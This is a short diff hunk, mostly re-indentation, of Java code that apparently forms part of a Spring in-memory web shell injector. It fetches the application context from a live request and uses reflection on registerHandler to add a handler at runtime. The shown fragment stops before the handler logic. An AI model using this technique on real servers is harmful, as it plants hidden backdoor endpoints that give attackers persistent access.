@@ -6,9 +6,9 @@ try{
     javax.servlet.http.HttpServletRequest httpServletRequest = requestAttributes.getRequest();
     org.springframework.web.context.support.GenericWebApplicationContext webApplicationContext = (org.springframework.web.context.support.GenericWebApplicationContext) httpServletRequest.getAttribute("org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE");
 
-        org.springframework.web.method.HandlerMethod handlerMethod = new org.springframework.web.method.HandlerMethod(o, m);
-        org.springframework.web.servlet.HandlerExecutionChain handlerExecutionChain = new org.springframework.web.servlet.HandlerExecutionChain(handlerMethod);
-        org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping handlerMapping = webApplicationContext.getBean(org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping.class);
+    org.springframework.web.method.HandlerMethod handlerMethod = new org.springframework.web.method.HandlerMethod(o, m);
+    org.springframework.web.servlet.HandlerExecutionChain handlerExecutionChain = new org.springframework.web.servlet.HandlerExecutionChain(handlerMethod);
+    org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping handlerMapping = webApplicationContext.getBean(org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping.class);
     java.lang.reflect.Method registerHandlerMethod = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(
             "registerHandler",
             new Class[]{
